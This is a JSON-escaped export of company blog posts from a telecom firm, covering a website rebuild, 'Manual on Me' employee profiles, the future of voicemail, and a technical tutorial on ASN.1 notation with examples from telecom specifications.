I had use-cases where I wanted something that could be self-managed and hosted low maintenance and was a modern and scalable workflow.\\n\\n- The non-techy staff and blog posts such as this, the industry-standard now days is markdown. So I knew I needed markdown.\\n- For the techy to make a website that could be customizable, secure, scale, and use APIs - react is also an industry standard. In addition, I wanted something that generated just plain HTML so I could host on GitHub without an issue.\\n\\n:::tip The tech\\n* React/Typescript - Scalable modern framework that allows for complex API calls. For example, it came in handy for creating our [Careers Page](/careers)\\n* https://docusaurus.io - native support for markdown allowing for a rich blog (which is what you are reading today!)\\n* Github and GH Actions for hosting, building, and collaborating\\n:::\\n\\n## Lessons learned\\n### What went well\\n- 80/20 model was critical to get progress made in a week.\\n- Scoping the project with a defined time (1 week) helped. I scoped it in several ways such as focusing what links to include in the header and footer, as well as, keeping the original text as much as possible from the previous website. \\n- Keeping this initiative small. The fewer people, the faster one can move and make decisions and get stuff done.\\n- Accepting that a website is never complete and focus on getting something out of the door.\\n- Using React with live reload was a breeze for quickly testing and demoing out new component designs\\n\\n### The bad\\n- Don\'t waste time on illustrations. Illustrations are tricky because it is a love/hate relationship. Some will love, and others will dislike - and seldom a full agreement. Crafting good text will tell a better story than a cheap illustration that people remember. All in all, I probably wasted 5 hours trying to come up with solutions and doing research that ended with the original text I had in about 5 minutes of thinking.\\n- Handling a company-wide iniative, several people have opinions in how things can be best done. This critique and push back can be hard for some people but I never let this get to me mentally and instead followed my gut and kept pushing forward. \\n\\n### What I learned\\n- I learned a new framework and language - React, Typescript, Docusaurus\\n- I learned about modern website design concepts\\n- I learned how Github actions work\\n- I learned how to better prioritize my time\\n- I learned the importance of following your gut and doing what I am passionate about\\n- I learned how hard illustrations are\\n\\n## Today\\n\\nAfter the week was up, it was time to present this new website in our company-wide Friday demos. After a short 15 minute walkthrough, the excitement I bottled up has now been spread across the company. Several hip hip hoorays and smiles around. People feel like wgtwo\'s identity is now represented. Some that were never interested before are now providing feedback and are inspired to write blog posts.\\n\\nOur new website is a living, breathing machine telling our company\'s story one day at a time.\\n\\n*Overall, I want to say a special thanks to my little Senja Mae and my wife Sophia for chilling on the couch with me while I spent countless hours using Apple airplay to cast my computer screen on the tv while coding away.*"},{"id":"manual-on-me-matt-long","metadata":{"permalink":"/jp/blog/manual-on-me-matt-long","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-08-manual-on-me-matt-long/index.md","source":"@site/../blog/2022-02-08-manual-on-me-matt-long/index.md","title":"Manual on Me: Matt Long","description":"As I was waking up this morning, I started surfing Reddit.

One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.\\n\\nThe responses varied.  Some were mildly positive, but most were very cynical since this sort of testing can be misused by bad management.  However, this got me thinking and, eventually, writing this post.\\n\\n\x3c!-- truncate --\x3e\\n\\nLet\'s look at the supervisor mentioned on Reddit and view their actions in a charitable light.  It is entirely probable that they only wanted to better understand and work with their new direct reports.  This is undoubtedly great!  However, a personality test is not a particularly useful tool for this -- people are too varied, and lives are too complicated.  This [interview](https://knowledge.wharton.upenn.edu/article/the-science-of-personality-understanding-yourself-and-those-around-you/) with Brian Little, the author of \\"Me, Myself and Us: The Science of Personality and the Art of Well-Being,\\" discusses some of the problems with these sorts of assessments.\\n\\nAnd as an employee, who wants a supervisor that uses an impersonal online test to figure out the best way to work with someone?\\n\\n## Our Process\\n\\nAt [Working Group Two](https://www.wgtwo.com), we do things a little bit differently.  We follow a straightforward process of [treating employees like grownups](https://www.wgtwo.com/blog/were-all-grownups-here/).  I thought it might be worth talking about how we handle the \\"let\'s try to understand our employees\\" problem and share a public version of what I have shared inside the company.\\n\\nThe short answer to this is this: just ask.  Amazing!\\n\\nWhen new employees start working with us, we ask them to fill out a \\"Manual on Me.\\" Since we are a distributed company and everyone is _de-facto_ remote, this manual serves two purposes: it is a bit of an icebreaker and a powerful communication tool.  Everyone in the company has a \\"Manual on Me,\\" from the CEO and CTO to the most recent new hire.\\n\\nAs Professor Little notes: \\"Once you understand what a person\'s core projects are or even ask a person, \'How is it going, David?,\' it puts us in a position where we can actually treat humans as humans.  That to me is going to pay enormous benefits in the long term.\\"\\n\\nHere\'s what I was asked to put into _my_ manual:\\n* What I know about that people can ask me\\n* How I think about things\\n* Common mistakes I make in my interactions with others\\n* My expectations from others\\n* What frustrates me\\n* How to reach out and get in touch with me\\n* How to give me feedback\\n\\nAlthough nobody in the company remembers how this practice actually started, this is not a completely new idea.  I see that there are a few references to this concept around the internet, including at least one [online version](https://www.manualof.me).  Their [about page](https://www.manualof.me/about) cites a few previous inspirations and sources for this \\"personal user manual.\\"\\n\\nSo how does this solve the problem on Reddit?  Assuming the OP\'s new supervisor really wanted to know their employees, they could *just ask* and probably find out just as much (or more) than having everyone take the MBTI.\\n\\n## My \\"Manual on Me\\"\\n\\nSo what does my \\"Manual on Me\\" look like?  Here is what I wrote in the summer of 2018:\\n\\n:::note Manual on Me\\n\\n![](./mtl-grayscale.png)\\n\\n**What I know something about:**\\n- I know a little bit about a lot of things.\\n- Recently, I\'ve been doing a lot of cloud infrastructure work, so that is freshest in my mind.\\n- I\'ve also had experience with development of embedded Java VMs, garbage collection, graphics drivers, distributed workflow systems, robotics, AI, machine learning, and autonomous ships.\\n\\n**How I think about things:**\\n- I like to challenge how things are done and find simpler solutions.  This often involves understanding why things are currently done the way they are.\\n- I very much like to think about an end goal and develop solutions _towards_ the goal.\\n- While I like to think a little about the steps in the middle, I don\'t like planning them in great detail.\\n\\n**Common mistakes I make in my interaction with you:**\\n- Sometimes, I will offer possibilities and suggestions as a way of discussion -- sort of like the \\"rubber duck\\" development process.  This is not _meant_ as a negative criticism but intended to continue the conversation and explore possibilities.  But I do understand how it can be interpreted in other ways.  Let me know if this is annoying!\\n\\n**My expectations to you:**\\n- I expect people to try, experiment, and learn.\\n- I also hope that everyone feels comfortable speaking up and expressing their point of view and ideas.\\n- If something is not clear, ask for clarification.\\n\\n**What frustrates me:**\\n- Bureaucracy, particularly rules that exist without an explanation of why the rule exists.\\n- Broken software systems.  When tied with bureaucracy, these are often known as \\"Enterprise software.\\"\\n\\n**How to reach out to me:**\\n- I prefer asynchronous messaging\\n\\t- Work Slack is absolutely the easiest way to reach me\\n\\t- SMS is second-best\\n- Voice is also fine as long as it is a reasonable time or arranged through one of the async methods.\\n\\n**How to give me feedback:**\\n- I like feedback, and direct, actionable feedback is fantastic!\\n- If it is serious, I like to have time to digest the feedback before I need to give a response, if possible.\\n\\n:::\\n\\nMost of this is still true, but maybe it is time for an update!\\n\\n## A management perspective\\n\\nAs a manager who likes to make sure my team is happy and enjoying their work (to the extent that I can do so), I really like these.\\n\\nWhen talking to new colleagues, I have a great way to start conversations (\\"So, where have you been climbing recently?\\", \\"How\'re the corona regulations in Canada these days?\\", \\"What type of photography do you like to do?\\").\\n\\nThey also help with giving and receiving feedback.  Should I drop a note into Slack, then set up a video meeting?  How blunt should I be?  Should I expect to talk about the feedback immediately or schedule a follow-up meeting after they (or I) have had a chance to think?\\n\\nBut most importantly, we feel that the \\"Manual on Me\\" is a respectful, adult way to communicate preferences without trying to pigeonhole everyone into one of sixteen types."},{"id":"please-dont-leave-a-message-after-the-beep","metadata":{"permalink":"/jp/blog/please-dont-leave-a-message-after-the-beep","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","source":"@site/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","title":"Don\'t leave a message after the beep","description":"Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you?

Find out where voicemail - loved by some and hated by others - is heading.\\n\\n\x3c!--truncate--\x3e\\n\\n\u201cPlease leave your message after the beep\u201d - you\u2019ve probably heard it a million times, especially if you were born before 1982. Or you\u2019ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn\u2019t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn\u2019t know what else to say.\\n\\nFor many of us, those days are over. We just don\u2019t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don\u2019t even know if people who call me get to a voicemail system.\\n\\nTo others, voicemail is really crucial.\\n\\n> \u201cWe see the importance of voicemail increasing or declining based on specific demographics,\u201d says Luke Campbell, the CEO of [Vxt](https://www.vxt.co.nz), a communications technology company in New Zealand.\\n\\nLuke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name. To some, that might be a differentiator, to others a nuisance.\\n\\nBesides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million?\\n\\n### A vocal assistant\\n\\nKarel Bourgois paints a similar picture. He\u2019s the CEO of [Voxist](https://www.voxist.com), a voicemail and messaging app, based in France. He\u2019s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don\u2019t like talking.\\n\\n<img src=\\"/img/blog/voicemail.jpeg\\" alt=\\"Breaking up via voicemail\\" width=\\"300\\"/>\\n\\n> \u201cI see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,\u201d Karel says.\\n\\nSo voicemail systems continue to evolve. Users either don\u2019t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders.\\n\\nTo Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel\u2019s observations.\\n\\n### The routes you can go down\\n\\nIf you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful.\\n\\nAnother route is to make the user experience simpler. To make it easier and faster to listen to voicemail.\\n\\nThat\u2019s essentially what Working Group Two and the Swedish mobile operator challenger [Vimla](https://vimla.se) did. In response to a regulatory challenge by the Swedish Post & Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user\u2019s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people\u2019s voicemails (which PTS had set out to stop) and customers get a better messaging experience.\\n\\nThis simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two\u2019s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network.\\n\\n> \u201cWe genuinely think this is a better product for our customers,\u201d says Viktor Georgsson, Head of Operations with Vimla.\\n\\nOther operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.\\n\\n### Ask yourself four questions...\\n\\nAt the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He\u2019s in charge of the effort of developing the company\u2019s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla\u2019s solution took its inspiration.\\n\\nYou need to ask yourself four questions, Marius points out. First, is the product **valuable** to its users? Is it **usable** for them? Is it **possible to build**? And is it **economically viable**?\\n\\n> \u201cVoicemail is a powerful reminder that a product doesn\u2019t need to be desired by everyone, but by someone,\u201d Marius concludes."},{"id":"the-specs-behind-the-specs-part-1","metadata":{"permalink":"/jp/blog/the-specs-behind-the-specs-part-1","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-01-11-the-spec-behind-the-specs.md","source":"@site/../blog/2022-01-11-the-spec-behind-the-specs.md","title":"The specs behind the specs part 1","description":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface","date":"2022-01-11T00:00:00.000Z","formattedDate":"January 11, 2022","tags":[{"label":"telco","permalink":"/jp/blog/tags/telco"},{"label":"ASN.1","permalink":"/jp/blog/tags/asn-1"},{"label":"dia","permalink":"/jp/blog/tags/dia"}],"readingTime":31.125,"hasTruncateMarker":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"/img/author-photos/swo.jpg","key":"seba"}],"frontMatter":{"slug":"the-specs-behind-the-specs-part-1","title":"The specs behind the specs part 1","date":"2022-01-11T00:00:00.000Z","tags":["telco","ASN.1","dia"],"authors":"seba"},"prevItem":{"title":"Don\'t leave a message after the beep","permalink":"/jp/blog/please-dont-leave-a-message-after-the-beep"},"nextItem":{"title":"Zero-day vulnerabilities - Log4j","permalink":"/jp/blog/log4j-security-vulnerability"}},"content":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface\\ndescription language for defining data structures that can be\\nserialized and deserialized in a cross-platform way.\\" -\\n[Wikipedia](https://en.wikipedia.org/wiki/ASN.1)\\n\\n\x3c!--truncate--\x3e\\n# Introduction\\n\\nToday you\'ll read about a specific language used to describe many of\\nthe messages in the telecom specifications. It will be a deep-dive\\ninto technical parts, so I imagine you could just use the blog post\\nwhen you want to look up different parts without fully reading it.\\n\\nIn **wgtwo** we use this language for some specific telco\\nmessages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP\\nand probably some more). They are defined directly in some of the\\ntelecom specifications, and because of that it is possible to use them\\nto send messages between different telecom cores.\\n\\nThis will *probably* be a two piece blog post as there is another\\ninterface describing language which is not ASN.1, and this is already\\na very long post. The other specification is used in Diameter\\ndictionaries, but I\'ll spare those for now. It has already taken me\\nabout half a year to finish up this article.\\n\\nThere might be some Erlang specific paragraphs here and there, but\\nthis blog post is mainly about ASN.1 as a specification, which can be\\nused in any language supporting it.  For Erlang specifics I came\\nacross [this blog\\npost](https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479)\\nwritten by Viacheslav Katsuba, and because it is build into Erlang by\\ndefault I recommend the\\n[APIs](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html)\\nas well.\\n\\n**DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.**\\n\\n# Abstract Syntax Notation One\\n\\nAbstract Syntax Notation One (ASN.1 for short) provides a\\nhigh level description of messages. It abstracts the language\\nimplementations from the protocol design.\\n\\nIt was initially used by [Open Systems Interconnection\\n(OSI)](https://en.wikipedia.org/wiki/Open_Systems_Interconnection) to\\ndescribe email messages but is used by many other applications\\nespecially within telecommunications and cryptography.\\n\\nYou might have heard of similar such abstract syntax notations used\\nfor interface definitions such as Google Protocol Buffers, or\\nFacebook\'s Apache Thrift, but those languages have not been managed by\\na standardization organization, so the owning corporations could (in\\ntheory) make breaking changes or change the license or even remove the\\nlanguage definitions overnight.\\n\\nAnyway, back to ASN.1\\n\\nThe first ASN.1 standardization came out 1984, and there have been\\nmany improvements since, for instance with the 1994 update which added\\nextended functionality for telecommunication technologies.\\n\\n\\"Long live ASN.1!\\" - Olivier Dubuisson from the [best\\nbook](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson)\\nthat I\'ve read on the subject.

Actually there were [more\\nbooks](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html)\\nthan I expected on the subject, but to make it perfectly clear: I did\\nonly read the one.)\\n\\nOff-topic but a bit of a fun fact I got from reading the book which I\\ndidn\'t know about before is that \'little Endian\' and \'big Endian\',\\nwhich are used to denote if the bitstring should be read from leftmost\\nor rightmost bit, actually originates from the 1726 best-seller\\n[Gulliver\'s\\ntravels](https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm).\\n\\n## The how and why\\n\\nASN.1 builds on the following ideas:\\n\\n- Data structures to be transmitted should be described regardless of\\n  programming language used transmitting or receiving them.\\n- The notation should allow building complex data types from basic\\n  types, and be able to do so recursively.\\n- The notation must be formal to prevent ambiguities.\\n\\nThat said, ASN.1 is not an abstract syntax in itself, but a language\\nto describe abstract syntaxes.\\n\\nThere are currently four main ASN.1 specifications (listed below), as\\nwell as at least one specification per encoding rule (listed in the\\n[last section](#encodings)).\\n\\n\\n| ITU-T no                                                                               | ASN.1 specifications                                                           |\\n| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |\\n| [X.680](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.680) | Abstract Syntax Notation One (ASN.1): Specification of basic notation          |\\n| [X.681](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.681) | Abstract Syntax Notation One (ASN.1): Information object specification         |\\n| [X.682](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.682) | Abstract Syntax Notation One (ASN.1): Constraint specification                 |\\n| [X.683](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.683) | Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications |\\n\\n\\n# Nitty gritty\\n\\n## Modules\\n\\nThe purpose of an ASN.1 module is to name a collection of types and/or\\nvalue definitions.\\n\\nIt consist of a module reference and an optional object identifier\\ntogether with the declaration of the `DEFINITIONS` type definition.\\nNote that even though the object identifier is optional, it is\\nconsidered bad practice to leave it out. The reason for it being\\noptional is for backward compatibility; it was not part of the\\noriginal ASN.1 specification.\\nThe `DEFINITIONS` keyword usually comes together with the `BEGIN` and\\n`END` keywords so multiple definitions can be done. (What else is the\\npoint of a module if not to make a collection...).\\n\\nThe Erlang ASN.1 compiler requires each module to be in a separate\\nfile, but generally one ASN.1 file could contain many modules.  Usual\\nfile endings are `.asn` and `.asn1`. One\\n[trick](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation)\\nthat can be used to circumvent this Erlang specific problem is to list\\nmultiple ASN.1 files in a new file ending with `set.asn`.\\n\\n\x3c!-- THIS LINK IS/WAS BROKEN 2022-12-23 AND IS THUS COMMENTED OUT\\nOne example of a file with many modules exist in the CAP specification\\n[3GPP TS 29.078](https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1597)\\n--\x3e\\n\\nThe ASN.1 template for a module\\n```asn.1\\nModuleReference ObjectIdentifier\\nDEFINITIONS ::= BEGIN\\n\\nEND\\n```\\nas seen in an example\\n\\n```asn.1\\nCAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1)\\nmodules(3) cap-operationcodes(53) version8(7)}\\n\\nDEFINITIONS ::= BEGIN\\n```\\n\\nFor information about the object identifier see the [types section](#object-identifier)\\n\\n### Importing from other modules\\n\\nImporting types, values and other structures from other modules can be\\ndone with the `IMPORTS` and `FROM` keywords in the beginning of the\\nmodule body.

Comments starts with double dash `--` and ends with either a\\nnewline or another `--`, whichever comes first.\\n\\n## Assignments and naming\\n\\nThe rules specify that type references must start with an uppercase\\nletter and may not end with a dash `-`. It may also only contain\\nupper- and lower-case letters, digits or dashes `-`.  The syntax for a\\ntype assignment is\\n\\n```asn.1\\nTypeRef ::= TypeDefinition\\n```\\n\\nFor instance\\n```asn.1\\nInvokeIdType ::= INTEGER (-128..127)\\n\\nCancelArg ::= CHOICE {\\n    invokeID        [0] InvokeID,\\n    allRequests     [1] NULL\\n}\\n\\nDuration ::= INTEGER (-2..86400)\\n\\nInteger4 ::= INTEGER (0..2147483647)\\n\\nInterval ::= INTEGER (-1..60000)\\n\\nInvokeID ::= InvokeIdType\\n\\nLegID ::= CHOICE {\\n    sendingSideID   [0] LegType,\\n    -- used in operations sent from SCF to SSF\\n    receivingSideID [1] LegType\\n    -- used in operations sent from SSF to SCF\\n}\\n\\nLegType ::= OCTET STRING (SIZE(1))\\n\\nServiceKey ::= Integer4\\n```\\n\\nValue references have a similar syntax as type references except that\\nvalue references must start with a lower-case letter, and also carry\\nthe values type.\\n\\nSyntax\\n```asn.1\\nvalueRef Type ::= value\\n```\\n\\nFor example\\n```asn.1\\nleg1 LegType ::= \'01\'H\\nleg2 LegType ::= \'02\'H\\n\\nhighLayerCompatibilityLength            INTEGER ::= 2\\nminAChBillingChargingLength             INTEGER ::= 0\\n```\\n\\n# Types\\n\\nNow when we have talked a bit about naming references, and how to\\nassign values and types I\'ll go over which built-in types exist, and\\nhow to create new types.\\n\\nThere are some common types, each consists of a type reference and a\\ntag number.  The tag number is used to identify it when sending the\\ntype in the network.

Note that `CHOICE` and `SELECTION` does not [need to]\\nhave their own universal tags, due to those are consisting of other\\ntypes.\\n\\n## Basic types\\n\\n### BOOLEAN\\n\\nThe `BOOLEAN` type takes values `TRUE` or `FALSE`.\\n\\n```asn.1\\nAudibleIndicator ::= CHOICE {\\n    tone       BOOLEAN,\\n    burstList  [1] BurstList\\n}\\n\\n```\\n\\nHere the value `tone` of the composit type `AudibleIndicator` is of\\ntype `BOOLEAN`. Note: It was one of the cleanest example I could find\\nof a `BOOLEAN` in the ASN.1 files we use, because Telco often use a\\nspecial \\"trick\\" when it comes to booleans in order to save bandwidth,\\ni.e. the `NULL` type.\\n\\n### NULL\\n\\nThe `NULL` type is basically a placeholder, where the recognition of a\\nvalue is important but the actual value is not.\\n\\nIn 3GPP it is similar to `BOOLEAN` in the sense that a defined `NULL`\\nvalue is considered `TRUE` and if the value is missing it is\\nconsidered `FALSE`. The reason for this is that when sent over the\\nnetwork with [BER encoding](#encodings), it will take no space because\\n`BOOLEAN` is always of length 1 but `NULL` is always length 0,\\ni.e. `NULL` does not contain a value.\\n\\n```asn.1\\nCancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {\\n    invokeID            [0] InvokeID,\\n    allRequests         [1] NULL,\\n    callSegmentToCancel [2] CallSegmentToCancel {bound}\\n}\\n```\\n\\nin this example `allRequests` can be defined (then only the tag is\\ntransmitted) or not at all.\\n\\n### INTEGER\\n\\n`INTEGER` takes any of the infinite set of integer values. It can also\\nhave the additional notation that names some of the values.\\n\\n\\n```asn.1\\nGSMMAPOperationLocalvalue ::= INTEGER{\\n    updateLocation (2),\\n    cancelLocation (3),\\n    provideRoamingNumber (4),\\n    noteSubscriberDataModified (5),\\n    resumeCallHandling (6),\\n    insertSubscriberData (7),\\n    -- rest of the named integers --\\n}\\n```\\n\\n```asn.1\\nlocalvalue1 GSMMAPOperationLocalvalue ::= updateLocation\\nlocalvalue2 GSMMAPOperationLocalvalue ::= 2\\nlocalvalue3 GSMMAPOperationLocalvalue ::= -55413459\\n```\\nare all valid `GSMMAPOperationLocalvalue`s.\\n\\n### ENUMERATED\\n\\n`ENUMERATED` has the same interpretation as `INTEGER` but will hold\\nspecific values only.\\n\\n\\n```asn.1\\nRequestedInformationType ::= ENUMERATED {\\n    callAttemptElapsedTime(0),\\n    callStopTime(1),\\n    callConnectedElapsedTime(2),\\n    calledAddress(3),\\n    releaseCause(30)\\n}\\n```\\n\\n```asn.1\\nreqInfoType1 RequestedInformationType ::= callAttemptElapsedTime\\nreqInfoType2 RequestedInformationType ::= 0\\n```\\n\\nare both valid values of `RequestInformationType`, while this is not:\\n\\n```asn.1\\nnotValidReqInfoType RequestedInformationType ::= 4\\n```\\n\\n### BIT STRING\\n\\n`BIT STRING` takes values that are a sequence of zero or more bits. It\\ncan also take an additional notation that name certain bits in the bit\\nsequence.\\n\\n```asn.1\\nDeferredLocationEventType ::= BIT STRING {\\n    msAvailable (0) ,\\n    enteringIntoArea (1),\\n    leavingFromArea (2),\\n    beingInsideArea (3) ,\\n    periodicLDR (4)\\n} (SIZE (1..16))\\n```\\n\\n```asn.1\\neventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)\\neventType2 DeferredLocationEventType ::= \'10010\'B\\neventType3 DeferredLocationEventType ::= \'12\'H\\n```\\n\\nare all valid value definitions of the same bit sequence where the\\nfirst and third bits are set, and no other bits are set.  The `B` stands\\nfor binary representation and `H` for hexadecimal representation.\\n\\nThe `SIZE` is a constraint on the type defining it to be of a specific\\nlength. This keyword comes as an extra notation for many of the\\n`STRING` types below (as well as some of the other types).\\n\\n### OCTET STRING\\n\\nType `OCTET STRING` takes values that are an ordered sequence of zero\\nor more (eight-bit) octets.\\n\\n```asn.1\\nMM-Code ::= OCTET STRING (SIZE (1))\\n```\\n\\nIn the same manner as `BIT STRING` both values below are valid\\ninstances of `MM-Code`:\\n\\n```asn.1\\niMSI-Attach1 MM-Code ::= \'00000010\'B\\niMSI-Attach2 MM-Code ::= \'02\'H\\n```\\n\\nwhile\\n\\n```asn.1\\nnotValidIMSI-Attach MM-Code ::= \'10010\'B\\n```\\n\\nis not considered a valid value due to it not being a multiple of eight bits.\\n\\n### OBJECT IDENTIFIER\\n\\nThe `OBJECT IDENTIFIER` type (shortened `OID`) names information\\nobjects such as ASN.1 modules. The named information object is a node\\non an object identifier tree that is managed at the international\\nlevel.\\n\\nETSI for instance is managed by ITU-T\\n`itu-t(0) identified-organization(4) etsi(0)`\\n\\n<div>\\n    <img src=\\"/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif\\" alt=\\"ETSI OID tree\\" />\\n</div>\\n\\nand as can see in the `Modules` example version 8 of cap-datatypes is part of ETSI.\\n`CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}`\\n\\nOther root arcs\\n\\n| Root | Organization    |\\n| ---- | --------------- |\\n| 0    | ITU-T           |\\n| 1    | ISO             |\\n| 2    | joint-iso-itu-t |\\n\\nThe labels are optional and the reference could also be written as `{0\\n4 0 0 1 3 52 7}`.

It will be tagged `[0]` or `[1]` respectively, that is\\nwhy `CHOICE` doesn\'t have it\'s own universal tag, as it is derived\\nfrom ASN.1 specification.\\n\\n### SEQUENCE (OF)\\n\\n`SEQUENCE` and `SEQUENCE OF` are used for composing multiple types.\\n\\n```asn.1\\nEventTypeSMS ::= ENUMERATED {\\n    sms-CollectedInfo                   (1),\\n    o-smsFailure                        (2),\\n    o-smsSubmission                     (3),\\n    sms-DeliveryRequested               (11),\\n    t-smsFailure                        (12),\\n    t-smsDelivery                       (13)\\n}\\nMonitorMode ::= ENUMERATED {\\n    interrupted                         (0),\\n    notifyAndContinue                   (1),\\n    transparent                         (2)\\n}\\n\\nSMSEvent ::= SEQUENCE {\\n    eventTypeSMS   [0] EventTypeSMS,\\n    monitorMode    [1] MonitorMode\\n}\\n\\nTone ::= SEQUENCE {\\n    toneID         [0] Integer4,\\n    duration       [1] Integer4 OPTIONAL,\\n    ...\\n}\\n```\\n\\nA value of the `SMSEvent` type have information on both `EventTypeSMS`\\nand `MonitorMode`. The fixed number of fields in the `SEQUENCE` type\\nare ordered.  Context-specific tagging (e.g. the `[0]`, `[1]`, `[2]`\\nstuff in the examples), is frequently applied for the structured\\ntypes, but one could also utilize the keywords `AUTOMATIC TAGGING` in\\nthe module definition.\\n\\n`SEQUENCE OF` on the other hand, holds an arbitrary number of fields\\nof a single type.\\n\\n```asn.1\\nFilterItem ::= CHOICE {\\n    equality         [0] AttributeValueAssertion,\\n    substrings       [1] SEQUENCE {\\n        type    ATTRIBUTE.&id({SupportedAttributes}),\\n        strings SEQUENCE OF CHOICE {\\n            initial [0] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            any     [1] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            final   [2] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type})\\n        }\\n    },\\n    greaterOrEqual   [2] AttributeValueAssertion,\\n    lessOrEqual      [3] AttributeValueAssertion,\\n    present          [4] AttributeType,\\n    approximateMatch [5] AttributeValueAssertion,\\n    extensibleMatch  [6] MatchingRuleAssertion\\n}\\n```\\n\\nIn the quite complex example above we see that the type `FilterItem`\\nis of type `CHOICE` and can take subtype called `strings`. `strings`\\nis of type `SEQUENCE OF CHOICE` which means it can take a list of\\nzero, one or more of `initial`, `any` or `final`. The example is quite\\ncomplex because it also uses multiple parameterized values. see\\n[Automatic, Implicit, Explicit tags](#automatic-implicit-explicit-tags)\\n\\nWe find another example in the DialoguePDUs module from\\n[Q.773](https://www.itu.int/rec/T-REC-Q.773-199706-I/en) where the\\nAARQ is of type `SEQUENCE`, and the third field `user-information` is\\nan `SEQUENCE OF` `EXTERNAL` type.\\n\\n```asn.1\\nAARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {\\n  protocol-version\\n    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},\\n  application-context-name  [1]  OBJECT IDENTIFIER,\\n  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL\\n}\\n```\\n\\nThey are quite different in how they are used, but they are encoded in\\na similar way. Some languages represent `SEQUENCE` internally as a\\n`struct`, and `SEQUENCE OF` as an array, but encoded they would look\\nquite similar.\\n\\n### SET (OF)\\n\\n`SET` and `SET OF` are similar to `SEQUENCE` and `SEQUENCE OF`\\nrespectively. The difference is that the composite types are\\nunordered.\\n\\nFrom `CAP-datatypes` we find an example of a `SET OF` with a\\n[parameterized component](#parameterized-components) specifying a size\\nconstraint.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n```\\n\\nOr an example of a value from the `TCAP-Tools` module 